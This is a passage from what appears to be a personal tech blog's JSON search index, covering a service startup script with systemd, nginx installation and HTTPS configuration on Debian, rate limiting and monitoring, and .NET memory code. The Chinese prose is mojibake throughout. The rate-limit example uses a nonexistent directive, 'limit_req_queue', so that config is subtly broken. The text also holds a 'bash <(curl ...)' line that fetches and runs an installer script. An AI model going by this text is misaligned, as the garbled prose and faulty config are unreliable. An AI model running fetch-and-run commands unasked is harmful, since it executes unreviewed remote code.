è·å–å½“å‰æ—¶é—´ä½œä¸ºæ—¥å¿—æ–‡ä»¶åçš„ä¸€éƒ¨åˆ†current_time=$(date +&quot;%Y-%m-%d_%H-%M-%S&quot;)# å¯åŠ¨ fileserver ç¨‹åºcd /root/fser || exitsudo nohup /root/fser/fileserver &gt; &quot;output_$&#123;current_time&#125;.log&quot; 2&gt;&amp;1 &amp;# å¯åŠ¨ IM.dll ç¨‹åºcd /root/nets4 || exitsudo nohup dotnet /root/nets4/IM.dll &gt; &quot;output_$&#123;current_time&#125;.log&quot; 2&gt;&amp;1 &amp;echo &quot;Services started successfully at $&#123;current_time&#125;. è„šæœ¬è¯´æ˜ï¼šcurrent_time&#x3D;$(date +â€%Y-%m-%d_%H-%M-%Sâ€) ç”¨äºç”Ÿæˆå½“å‰æ—¶é—´çš„å­—ç¬¦ä¸²ã€‚æ¯ä¸ªå¯åŠ¨å‘½ä»¤éƒ½åŒ…å« cd åˆ°ç›®æ ‡ç›®å½•åè¿è¡Œç¨‹åºï¼Œå¹¶å°†æ—¥å¿—æ–‡ä»¶å‘½åä¸ºåŒ…å«æ—¶é—´æˆ³çš„æ–‡ä»¶ã€‚ä½¿ç”¨ || exit ç¡®ä¿å¦‚æœ cd å¤±è´¥ï¼Œè„šæœ¬ä¼šä¸­æ–­ã€‚ 2. èµ‹äºˆè„šæœ¬æ‰§è¡Œæƒé™è¿è¡Œä»¥ä¸‹å‘½ä»¤ä¸ºè„šæœ¬èµ‹äºˆå¯æ‰§è¡Œæƒé™ï¼š 1chmod +x start_services.sh 3. è‡ªåŠ¨åŒ–æ‰§è¡Œä½¿ç”¨ systemd é…ç½®æœåŠ¡å¦‚æœéœ€è¦åœ¨ç³»ç»Ÿé‡å¯æ—¶è‡ªåŠ¨å¯åŠ¨ï¼Œå¯ä»¥é…ç½® systemd æœåŠ¡æ–‡ä»¶ï¼š åˆ›å»ºæœåŠ¡æ–‡ä»¶åœ¨ &#x2F;etc&#x2F;systemd&#x2F;system&#x2F; ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæœåŠ¡æ–‡ä»¶ï¼Œæ¯”å¦‚ my_services.serviceï¼š 12345678910111213ini[Unit]Description=Start Custom ServicesAfter=network.target[Service]Type=simpleExecStart=/path/to/start_services.shRestart=on-failure[Install]WantedBy=multi-user.target å¯åŠ¨å¹¶å¯ç”¨æœåŠ¡ 123sudo systemctl daemon-reloadsudo systemctl start my_services.servicesudo systemctl enable my_services.service ä»¥ä¸Šæ­¥éª¤å¯ä»¥æ»¡è¶³ä½ åœ¨é‡å¯æœåŠ¡å™¨æ—¶è‡ªåŠ¨å¯åŠ¨ç¨‹åºçš„éœ€æ±‚ã€‚æ¨èä½¿ç”¨ systemd æ–¹æ³•æœåŠ¡ç®¡ç†æ–¹å¼ï¼Œæä¾›äº†ç›‘æ§å’Œè‡ªåŠ¨é‡å¯åŠŸèƒ½ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"},{"name":"AOT","slug":"AOT","permalink":"https://banjinmei.github.io/tags/AOT/"}],"author":"mu"},{"title":"Debian nginx https","slug":"Debian-Nginx","date":"2024-05-07T11:13:24.000Z","updated":"2025-03-16T16:14:45.510Z","comments":true,"path":"2024/05/07/Debian-Nginx/","permalink":"https://banjinmei.github.io/2024/05/07/Debian-Nginx/","excerpt":"","text":"debianå®‰è£… nginxåœ¨Debianç³»ç»Ÿä¸Šå®‰è£…Nginxï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š å¦‚æœ sudo: command not found 1apt-get install sudo é¦–å…ˆï¼Œæ›´æ–°çš„åŒ…ç´¢å¼•ï¼š 1sudo apt update æ¥ä¸‹æ¥ï¼Œå®‰è£…Nginxï¼š 1sudo apt install nginx å®‰è£…å®Œæˆåï¼Œå¯åŠ¨NginxæœåŠ¡ï¼š 1sudo systemctl start nginx ï¼ˆå¯é€‰ï¼‰è®¾ç½®Nginxå¼€æœºè‡ªå¯åŠ¨ï¼š 1sudo systemctl enable nginx å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ£€æŸ¥Nginxçš„çŠ¶æ€ï¼š 1sudo systemctl status nginx ç°åœ¨ï¼Œå¯ä»¥åœ¨Webæµè§ˆå™¨ä¸­è¾“å…¥æœåŠ¡å™¨çš„IPåœ°å€æˆ–åŸŸåæ¥è®¿é—®é»˜è®¤çš„Nginxæ¬¢è¿é¡µé¢ã€‚å¦‚æœæ˜¯åœ¨æœ¬åœ°å®‰è£…çš„Nginxï¼Œå¯ä»¥é€šè¿‡è®¿é—® http://localhost æ¥æŸ¥çœ‹è¿™ä¸ªé¡µé¢ã€‚ å¦‚æœéœ€è¦é…ç½®Nginxï¼Œå¯ä»¥ç¼–è¾‘ &#x2F;etc&#x2F;nginx&#x2F;nginx.conf æ–‡ä»¶æˆ–è€…åœ¨ &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F; ç›®å½•ä¸‹åˆ›å»ºæˆ–ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ sudo ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;your-config &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F; å‘½ä»¤æ¥å¯ç”¨å®ƒã€‚ 1sudo whereis nginx Nginx é»˜è®¤å®‰è£…ä½ç½®é…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½• &#x2F;etc&#x2F; nginxé…ç½® æ£€æµ‹Nginxé…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡® 12nginx -té‡è½½Nginxé…ç½® 1nginx -s reload è‡ªå®šä¹‰Nginxç«™ç‚¹é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F; nginxç½‘ç«™ç›®å½•&#x2F;var&#x2F;www&#x2F; åŸŸåè¯ä¹¦ é˜¿é‡Œäº‘è¯ä¹¦å…è´¹è¯ä¹¦https://help.aliyun.com/zh/ssl-certificate/user-guide/overview-of-free-certificates-overview-of-free-certificateshttps://yundun.console.aliyun.com/?p=cas#/certExtend/free/cn-hangzhou æœåŠ¡å™¨ç±»å‹NginxTomcatApachelsJKSå…¶ä»– æ ¹è¯ä¹¦ä¸‹è½½è¯ä¹¦æ ¼å¼pem&#x2F;keypfxcrt&#x2F;keypfxjkspem&#x2F;keycrt&#x2F;cer Nginxéƒ¨ç½²https://help.aliyun.com/zh/ssl-certificate/user-guide/install-ssl-certificates-on-nginx-servers-or-tengine-servers? ls &#x2F;root&#x2F;cerf&#x2F;www.dtso.net.pem 1nginx -s reload #é‡æ–°è½½å…¥é…ç½®æ–‡ä»¶ã€‚ è¯´æ˜æŠ¥é”™the â€œsslâ€ parameter requires ngx_http_ssl_moduleï¼šæ‚¨éœ€è¦é‡æ–°ç¼–è¯‘Nginxå¹¶åœ¨ç¼–è¯‘å®‰è£…çš„æ—¶å€™åŠ ä¸Šâ€“with-http_ssl_moduleé…ç½®ã€‚ æŠ¥é”™â€&#x2F;cert&#x2F;3970497_demo.aliyundoc.com.pemâ€:BIO_new_file() failed (SSL: error:02001002:system library:fopen:No such file or directory:fopen(â€˜&#x2F;cert&#x2F;3970497_demo.aliyundoc.com.pemâ€™,â€™râ€™) error:2006D080:BIO routines:BIO_new_file:no such file)ï¼šæ‚¨éœ€è¦å»æ‰è¯ä¹¦ç›¸å¯¹è·¯å¾„æœ€å‰é¢çš„&#x2F;ã€‚ä¾‹å¦‚ï¼Œæ‚¨éœ€è¦å»æ‰&#x2F;cert&#x2F;cert-file-name.pemæœ€å‰é¢çš„&#x2F;ï¼Œä½¿ç”¨æ­£ç¡®çš„ç›¸å¯¹è·¯å¾„cert&#x2F;cert-file-name.pemã€‚ nginx -s reload åŸŸå443å®‰å…¨ç»„ é˜²ç«å¢™å¼€å¯~ 443 443 443 .conf ç¤ºä¾‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748server &#123; listen 443 ssl http2; listen [::]:443 ssl http2; server_name www.x.com; ssl_certificate /root/cerf/www.x.com.pem; ssl_certificate_key /root/cerf/www.x.com.key; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; # HSTS (optional) add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains; preload&quot;; # SSL session cache (optional) ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; # SSL stapling (optional, if you use OCSP) # ssl_stapling on; # ssl_stapling_verify on; # DH param is dependent on certificate size #ssl_dhparam /path/to/dhparam.pem; location / &#123; root /usr/share/nginx/html; index index.html index.htm; &#125; # other locations... # Redirect non-https to https # server &#123; # listen 80; # server_name your.domain.com; # return 301 https://$host$request_uri; # &#125; # Error handling error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; &#125; è¯·æ±‚æ¬¡æ•°é™åˆ¶Nginx æœ¬èº«å¹¶æ²¡æœ‰é»˜è®¤çš„è¯·æ±‚æ¬¡æ•°é™åˆ¶ï¼Œä¸è¿‡å®ƒæä¾›äº†ç›¸å…³æ¨¡å—ï¼ˆå¦‚ngx_http_limit_req_moduleï¼‰æ¥å¸®åŠ©è®¾ç½®è¯·æ±‚æ¬¡æ•°é™åˆ¶ã€‚ä»¥ä¸‹ä¸ºè¯¦ç»†ä»‹ç»ï¼šæ— é»˜è®¤è¯·æ±‚æ¬¡æ•°é™åˆ¶è¯´æ˜Nginx æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ HTTP æœåŠ¡å™¨å’Œåå‘ä»£ç†æœåŠ¡å™¨ï¼Œå®ƒè®¾è®¡ä¸ºé€šç”¨çµæ´»çš„å·¥å…·ï¼Œæ‰€ä»¥åœ¨é»˜è®¤æƒ…å†µä¸‹ä¸ä¼šå¯¹è¯·æ±‚æ¬¡æ•°è¿›è¡Œé™åˆ¶ã€‚è¿™æ ·çš„è®¾è®¡å…è®¸ç”¨æˆ·æ ¹æ®è‡ªèº«çš„å…·ä½“ä¸šåŠ¡éœ€æ±‚å’ŒæœåŠ¡å™¨æ€§èƒ½æ¥å®šåˆ¶è¯·æ±‚é™åˆ¶ç­–ç•¥ã€‚ä½¿ç”¨ngx_http_limit_req_moduleè®¾ç½®è¯·æ±‚æ¬¡æ•°é™åˆ¶ngx_http_limit_req_moduleæ¨¡å—å¯ä»¥é™åˆ¶å•ä½æ—¶é—´å†…çš„è¯·æ±‚æ•°é‡ï¼Œé˜²æ­¢æœåŠ¡å™¨å—åˆ°è¿‡å¤šè¯·æ±‚çš„å†²å‡»ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨è¯¥æ¨¡å—è®¾ç½®è¯·æ±‚æ¬¡æ•°é™åˆ¶çš„ç¤ºä¾‹ï¼š é…ç½®é™åˆ¶åŒºåŸŸé¦–å…ˆï¼Œéœ€è¦åœ¨httpå—ä¸­å®šä¹‰ä¸€ä¸ªé™åˆ¶åŒºåŸŸï¼Œç”¨äºå­˜å‚¨è¯·æ±‚çš„çŠ¶æ€ä¿¡æ¯ã€‚ 12345678910111213141516171819http &#123; # å®šä¹‰ä¸€ä¸ªåä¸ºoneçš„é™åˆ¶åŒºåŸŸï¼Œæ¯ç§’é’Ÿå…è®¸å¤„ç†10ä¸ªè¯·æ±‚ limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s; server &#123; listen 80; server_name example.com; location / &#123; # åº”ç”¨åä¸ºoneçš„é™åˆ¶åŒºåŸŸ limit_req zone=one; # å½“è¯·æ±‚è¶…è¿‡é™åˆ¶æ—¶ï¼Œè¿”å›503çŠ¶æ€ç  limit_req_status 503; # å…è®¸è¶…è¿‡é™åˆ¶çš„è¯·æ±‚åœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…ï¼Œæœ€å¤šå…è®¸5ä¸ªè¯·æ±‚æ’é˜Ÿ limit_req_queue 5; # å…¶ä»–é…ç½®... root /var/www/html; index index.html; &#125; &#125;&#125; é…ç½®è§£é‡Šlimit_req_zone $binary_remote_addr zone&#x3D;one:10m rate&#x3D;10r&#x2F;s;ï¼š$binary_remote_addrï¼šä»¥å®¢æˆ·ç«¯çš„ IP åœ°å€ä½œä¸ºé™åˆ¶çš„ä¾æ®ã€‚zone&#x3D;one:10mï¼šå®šä¹‰ä¸€ä¸ªåä¸ºoneçš„é™åˆ¶åŒºåŸŸï¼Œå ç”¨ 10MB çš„å†…å­˜ç©ºé—´ï¼Œç”¨äºå­˜å‚¨å®¢æˆ·ç«¯çš„è¯·æ±‚çŠ¶æ€ä¿¡æ¯ã€‚rate&#x3D;10r&#x2F;sï¼šè¯¥é™åˆ¶åŒºåŸŸæ¯ç§’é’Ÿæœ€å¤šå…è®¸å¤„ç† 10 ä¸ªè¯·æ±‚ã€‚limit_req zone&#x3D;one;ï¼šåœ¨locationå—ä¸­åº”ç”¨åä¸ºoneçš„é™åˆ¶åŒºåŸŸã€‚limit_req_status 503;ï¼šå½“è¯·æ±‚è¶…è¿‡é™åˆ¶æ—¶ï¼Œè¿”å› 503 çŠ¶æ€ç ï¼ˆæœåŠ¡ä¸å¯ç”¨ï¼‰ã€‚limit_req_queue 5;ï¼šå…è®¸è¶…è¿‡é™åˆ¶çš„è¯·æ±‚åœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…ï¼Œæœ€å¤šå…è®¸ 5 ä¸ªè¯·æ±‚æ’é˜Ÿã€‚ 1sudo nginx -s reload é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œå°±å¯ä»¥ä¸º Nginx è®¾ç½®è¯·æ±‚æ¬¡æ•°é™åˆ¶ã€‚ä¸åŒçš„ä¸šåŠ¡åœºæ™¯å¯èƒ½éœ€è¦ä¸åŒçš„é™åˆ¶ç­–ç•¥ï¼Œå¯ä»¥æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´é™åˆ¶åŒºåŸŸçš„å‚æ•°ã€‚ æ€æ ·ç›‘æ§NginxæœåŠ¡å™¨çš„æ€§èƒ½ï¼Ÿç›‘æ§ Nginx æœåŠ¡å™¨çš„æ€§èƒ½æœ‰åŠ©äºåŠæ—¶å‘ç°æ½œåœ¨é—®é¢˜ï¼Œä¿éšœæœåŠ¡å™¨çš„ç¨³å®šè¿è¡Œã€‚ä»¥ä¸‹ä¸ºä»‹ç»å¤šç§ç›‘æ§ Nginx æœåŠ¡å™¨æ€§èƒ½çš„æ–¹æ³•ï¼š 1. ä½¿ç”¨ Nginx è‡ªå¸¦çš„çŠ¶æ€æ¨¡å—Nginx çš„ngx_http_stub_status_moduleæ¨¡å—å¯ä»¥æä¾›åŸºæœ¬çš„æœåŠ¡å™¨çŠ¶æ€ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤å¼€å¯å¹¶ä½¿ç”¨å®ƒï¼šé…ç½® Nginxï¼šåœ¨ Nginx é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 123456789101112nginxserver &#123; listen 80; server_name your_domain.com; location /nginx_status &#123; stub_status on; access_log off; allow 127.0.0.1; # å…è®¸è®¿é—®çš„IPåœ°å€ï¼Œå¯æ ¹æ®éœ€æ±‚ä¿®æ”¹ deny all; &#125;&#125; é‡æ–°åŠ è½½é…ç½®ï¼šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä½¿é…ç½®ç”Ÿæ•ˆï¼š 1sudo nginx -s reload æŸ¥çœ‹çŠ¶æ€ä¿¡æ¯ï¼šåœ¨æµè§ˆå™¨ä¸­è®¿é—®http://your_domain.com/nginx_statusï¼ˆæˆ–è€…ä½¿ç”¨curlå‘½ä»¤ï¼‰ï¼Œä¼šçœ‹åˆ°ç±»ä¼¼ä»¥ä¸‹çš„ä¿¡æ¯ï¼šplaintextActive connections: 2server accepts handled requests 4123 4123 4123Reading: 0 Writing: 1 Waiting: 1Active connectionsï¼šå½“å‰æ´»è·ƒçš„è¿æ¥æ•°ã€‚acceptsï¼šNginx å·²ç»æ¥å—çš„å®¢æˆ·ç«¯è¿æ¥æ€»æ•°ã€‚handledï¼šNginx å·²ç»å¤„ç†çš„å®¢æˆ·ç«¯è¿æ¥æ€»æ•°ã€‚requestsï¼šNginx å·²ç»å¤„ç†çš„å®¢æˆ·ç«¯è¯·æ±‚æ€»æ•°ã€‚Readingï¼šNginx æ­£åœ¨è¯»å–å®¢æˆ·ç«¯è¯·æ±‚å¤´çš„è¿æ¥æ•°ã€‚Writingï¼šNginx æ­£åœ¨å‘å®¢æˆ·ç«¯å‘é€å“åº”çš„è¿æ¥æ•°ã€‚Waitingï¼šå¤„äºç©ºé—²çŠ¶æ€çš„ä¿æŒæ´»åŠ¨è¿æ¥æ•°ã€‚ 2. åˆ©ç”¨æ—¥å¿—åˆ†æNginx çš„è®¿é—®æ—¥å¿—å’Œé”™è¯¯æ—¥å¿—åŒ…å«äº†å¤§é‡æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¯ä»¥å¸®åŠ©åˆ†ææœåŠ¡å™¨çš„æ€§èƒ½å’Œç”¨æˆ·è¡Œä¸ºã€‚è®¿é—®æ—¥å¿—ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒNginx çš„è®¿é—®æ—¥å¿—ä½äº&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logã€‚å¯ä»¥ä½¿ç”¨å·¥å…·ï¼ˆå¦‚awkã€grepç­‰ï¼‰åˆ†ææ—¥å¿—æ–‡ä»¶ï¼Œä¾‹å¦‚ç»Ÿè®¡ä¸åŒ HTTP çŠ¶æ€ç çš„è¯·æ±‚æ•°é‡ï¼š 1grep &#x27;HTTP/1.1&quot; 200&#x27; /var/log/nginx/access.log | wc -l # ç»Ÿè®¡çŠ¶æ€ ç ä¸º200çš„è¯·æ±‚æ•°é‡é”™è¯¯æ—¥å¿—ï¼šé”™è¯¯æ—¥å¿—é€šå¸¸ä½äº&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.logï¼Œé€šè¿‡æŸ¥çœ‹é”™è¯¯æ—¥å¿—å¯ä»¥å‘ç°æœåŠ¡å™¨è¿è¡Œè¿‡ç¨‹ä¸­å‡ºç°çš„é”™è¯¯å’Œå¼‚å¸¸æƒ…å†µã€‚ 3. ä½¿ç”¨ç¬¬ä¸‰æ–¹ç›‘æ§å·¥å…·Prometheus å’Œ Grafanaï¼šPrometheusï¼šæ˜¯ä¸€ä¸ªå¼€æºçš„ç³»ç»Ÿç›‘æ§å’Œè­¦æŠ¥å·¥å…·åŒ…ï¼Œå®ƒå¯ä»¥é€šè¿‡nginx-vts-exporterï¼ˆç”¨äºæ”¶é›† Nginx çš„è¯¦ç»†æŒ‡æ ‡ï¼‰æ¥æ”¶é›† Nginx çš„æ€§èƒ½æŒ‡æ ‡ã€‚Grafanaï¼šç”¨äºå¯è§†åŒ–è¿™äº›æŒ‡æ ‡ï¼Œåˆ›å»ºç›´è§‚çš„ä»ªè¡¨ç›˜ã€‚é…ç½®æ­¥éª¤ï¼šå®‰è£…å¹¶é…ç½®nginx-vts-exporterï¼Œä½¿å…¶èƒ½å¤Ÿæ”¶é›† Nginx çš„æŒ‡æ ‡ã€‚é…ç½® Prometheusï¼Œè®©å®ƒä»nginx-vts-exporterè·å–æ•°æ®ã€‚åœ¨ Grafana ä¸­æ·»åŠ  Prometheus ä½œä¸ºæ•°æ®æºï¼Œå¹¶åˆ›å»ºä»ªè¡¨ç›˜æ¥å±•ç¤º Nginx çš„æ€§èƒ½æŒ‡æ ‡ï¼Œå¦‚è¯·æ±‚é€Ÿç‡ã€å“åº”æ—¶é—´ç­‰ã€‚Zabbixï¼šæ˜¯ä¸€ä¸ªä¼ä¸šçº§çš„å¼€æºç›‘æ§è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥ç›‘æ§ Nginx æœåŠ¡å™¨çš„å„ç§æ€§èƒ½æŒ‡æ ‡ï¼Œå¦‚ CPU ä½¿ç”¨ç‡ã€å†…å­˜ä½¿ç”¨ç‡ã€ç½‘ç»œæµé‡ç­‰ã€‚éœ€è¦åœ¨ Nginx æœåŠ¡å™¨ä¸Šå®‰è£… Zabbix Agentï¼Œå¹¶åœ¨ Zabbix Server ä¸Šé…ç½®ç›¸åº”çš„ç›‘æ§é¡¹å’Œè§¦å‘å™¨ã€‚ 4. ç³»ç»Ÿçº§ç›‘æ§å·¥å…·top å’Œ htopï¼štopæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ç³»ç»Ÿç›‘æ§å·¥å…·ï¼Œå¯ä»¥å®æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸­å„ä¸ªè¿›ç¨‹çš„èµ„æºä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬ CPU ä½¿ç”¨ç‡ã€å†…å­˜ä½¿ç”¨ç‡ç­‰ã€‚htopæ˜¯topçš„å¢å¼ºç‰ˆï¼Œæä¾›äº†æ›´ç›´è§‚çš„ç•Œé¢å’Œæ›´å¤šçš„åŠŸèƒ½ã€‚iostatï¼šç”¨äºç›‘æ§ç£ç›˜ I&#x2F;O çš„æ€§èƒ½ï¼ŒæŸ¥çœ‹ç£ç›˜çš„è¯»å†™é€Ÿåº¦ã€I&#x2F;O ç­‰å¾…æ—¶é—´ç­‰æŒ‡æ ‡ã€‚ä¾‹å¦‚ï¼Œæ‰§è¡Œiostat -x 1å¯ä»¥æ¯ç§’æ˜¾ç¤ºä¸€æ¬¡ç£ç›˜çš„è¯¦ç»†ä¿¡æ¯ã€‚netstat å’Œ ssï¼šnetstatå¯ä»¥æ˜¾ç¤ºç½‘ç»œè¿æ¥ã€è·¯ç”±è¡¨ã€ç½‘ç»œæ¥å£ç­‰ä¿¡æ¯ï¼Œè€Œssæ˜¯netstatçš„æ›¿ä»£å“ï¼Œæ€§èƒ½æ›´å¥½ã€‚å¯ä»¥ä½¿ç”¨å®ƒä»¬æ¥ç›‘æ§ Nginx æœåŠ¡å™¨çš„ç½‘ç»œè¿æ¥æƒ…å†µï¼Œä¾‹å¦‚æŸ¥çœ‹å½“å‰çš„ TCP è¿æ¥æ•°ï¼šbashnetstat -an | grep :80 | wc -l # ç»Ÿè®¡ç«¯å£80çš„TCPè¿æ¥æ•° debian å¸è½½ nginxåœ¨Debianç³»ç»Ÿä¸­ï¼Œè¦å¸è½½nginxï¼Œå¯ä»¥ä½¿ç”¨apt-getå‘½ä»¤ã€‚ä»¥ä¸‹æ˜¯å…·ä½“æ­¥éª¤ï¼š é¦–å…ˆï¼Œéœ€è¦çŸ¥é“nginxæ˜¯å¦æ˜¯é€šè¿‡aptå®‰è£…çš„ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å·²å®‰è£…çš„nginxåŒ…ï¼š 1dpkg -l | grep nginx å¦‚æœnginxæ˜¯é€šè¿‡aptå®‰è£…çš„ï¼Œå¯ä»¥ä½¿ç”¨apt-getå‘½ä»¤æ¥å¸è½½å®ƒï¼š 1sudo apt-get remove nginx nginx-common è¿™å°†ä¼šå¸è½½nginxåŠå…¶é…ç½®æ–‡ä»¶ã€‚ ä¸ºäº†æ¸…é™¤æ‰€æœ‰nginxçš„é…ç½®æ–‡ä»¶å’Œä¾èµ–ï¼Œå¯ä»¥æ‰§è¡Œï¼š 1sudo apt-get purge nginx nginx-common æœ€åï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ¸…é™¤æ— ç”¨çš„åŒ…å’Œä¾èµ–ï¼š 1sudo apt-get autoremove ç¡®ä¿åœ¨æ‰§è¡Œè¿™äº›æ­¥éª¤ä¹‹å‰ï¼Œå·²ç»åœæ­¢äº†nginxæœåŠ¡ï¼š 1sudo systemctl stop nginx å¦‚æœnginxæ˜¯é€šè¿‡å…¶ä»–æ–¹å¼å®‰è£…çš„ï¼Œæ¯”å¦‚ç¼–è¯‘å®‰è£…ï¼Œé‚£ä¹ˆéœ€è¦æ‰‹åŠ¨åˆ é™¤nginxæˆ–è€…æŒ‰ç…§å…¶å®‰è£…æ–¹å¼æ¥å¸è½½ã€‚ å¸¸ç”¨çš„Nginxç®¡ç†å·¥å…·ï¼š1. Nginx UIé¡¹ç›®åœ°å€: GitHub - Nginx UIhttps://github.com/0xJacky/nginx-uiä¸»è¦ç‰¹ç‚¹: ç®€åŒ–é…ç½®: é€šè¿‡å›¾å½¢åŒ–ç•Œé¢ç®€åŒ–Nginxçš„é…ç½®è¿‡ç¨‹ã€‚å®æ—¶ç›‘æ§: æ˜¾ç¤ºNginxæœåŠ¡å™¨çš„å…³é”®æŒ‡æ ‡ï¼Œå¦‚è¿æ¥æ•°ã€è¯·æ±‚å¤„ç†æ—¶é—´ç­‰ã€‚æ˜“äºæ‰©å±•: æ”¯æŒæ’ä»¶ç³»ç»Ÿï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€æ±‚å®‰è£…é¢å¤–çš„åŠŸèƒ½æ¨¡å—ã€‚é«˜æ•ˆç®¡ç†: é›†ä¸­ç®¡ç†å¤šä¸ªNginxå®ä¾‹ã€‚å®‰å…¨æ€§: æä¾›å¤šç§è®¤è¯æœºåˆ¶ï¼Œç¡®ä¿æ•°æ®çš„å®‰å…¨ä¼ è¾“ã€‚å…¼å®¹æ€§: æ”¯æŒDockerç­‰å®¹å™¨åŒ–å¹³å°ã€‚ bash &lt;(curl -L -s https://raw.githubusercontent.com/0xJacky/nginx-ui/master/install.sh) install systemctl start nginx-ui systemctl stop nginx-ui 2. Nginx Proxy Manageré¡¹ç›®åœ°å€: GitHub - Nginx Proxy Managerhttps://github.com/NginxProxyManager/nginx-proxy-managerå®˜æ–¹ç½‘ç«™: Nginx Proxy Manager ä¸»è¦ç‰¹ç‚¹: ç¾è§‚å’Œå®‰å…¨çš„ç®¡ç†ç•Œé¢: æä¾›ç›´è§‚çš„ç”¨æˆ·ç•Œé¢ï¼Œæ–¹ä¾¿ç®¡ç†å’Œé…ç½®ã€‚è½»æ¾åˆ›å»ºè½¬å‘å’Œé‡å®šå‘: æ”¯æŒè‡ªå®šä¹‰SSLè¯ä¹¦ã€‚é«˜çº§Nginxé…ç½®: æä¾›é«˜çº§é…ç½®é€‰é¡¹ã€‚ç”¨æˆ·ç®¡ç†æƒé™å’Œå®¡è®¡æ—¥å¿—: æ”¯æŒå¤šç”¨æˆ·ç®¡ç†å’Œæ—¥å¿—è®°å½•ã€‚Dockeræ”¯æŒ: æä¾›é¢„æ„å»ºçš„Dockeré•œåƒï¼Œæ–¹ä¾¿éƒ¨ç½²","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":".NETè·å–å†…å­˜","slug":"NET-Memory","date":"2024-05-06T06:57:24.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/05/06/NET-Memory/","permalink":"https://banjinmei.github.io/2024/05/06/NET-Memory/","excerpt":"","text":"åœ¨.NET æ§åˆ¶å°åº”ç”¨ç¨‹åºä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨System.Diagnosticså‘½åç©ºé—´ä¸‹çš„Processç±»æ¥è·å–å½“å‰è¿›ç¨‹çš„å†…å­˜ä½¿ç”¨æƒ…å†µã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ä»£ç ï¼Œå±•ç¤ºå¦‚ä½•è·å–å¹¶æ˜¾ç¤ºå½“å‰è¿›ç¨‹çš„å†…å­˜ä½¿ç”¨é‡ï¼š 123456789101112131415161718192021222324using System;using System.Diagnostics; namespace DisplayProcessMemory&#123; class Program &#123; static void Main(string[] args) &#123; // è·å–å½“å‰è¿›ç¨‹ Process currentProcess = Process.GetCurrentProcess(); // ä½¿ç”¨éœ€è¦çš„å†…å­˜é‡ long workingSet64 = currentProcess.WorkingSet64; // æ˜¾ç¤ºå†…å­˜ä½¿ç”¨é‡ Console.WriteLine($&quot;å½“å‰è¿›ç¨‹å ç”¨å†…å­˜: &#123;workingSet64&#125; å­—èŠ‚&quot;); // å•ä½è½¬æ¢ä¸ºå…†å­—èŠ‚ double memoryInMB = workingSet64 / 1024.0 / 1024.0; Console.WriteLine($&quot;å½“å‰è¿›ç¨‹å ç”¨å†…å­˜: &#123;memoryInMB.ToString(&quot;F2&quot;)&#125; MB&quot;); &#125; &#125;&#125; åœ¨.NETä¸­ï¼Œå¯ä»¥ä½¿ç”¨System.Diagnosticså‘½åç©ºé—´ä¸‹çš„Processç±»æ¥è·å–å½“å‰è¿›ç¨‹çš„ä¿¡æ¯ï¼Œä½†æ˜¯ç›´æ¥è·å–ç½‘ç»œå¸¦å®½ä½¿ç”¨æƒ…å†µä¸æ˜¯Processç±»æä¾›çš„åŠŸèƒ½ã€‚ä½ å¯ä»¥ä½¿ç”¨System.Net.NetworkInformationå‘½åç©ºé—´ä¸‹çš„IPGlobalPropertiesç±»æ¥è·å–ç½‘ç»œæ¥å£çš„ä¿¡æ¯ï¼Œç„¶åç´¯è®¡æ‰€æœ‰ç½‘ç»œæ¥å£çš„ä¼ è¾“æ•°æ®é‡æ¥ä¼°ç®—å¸¦å®½ä½¿ç”¨ã€‚ 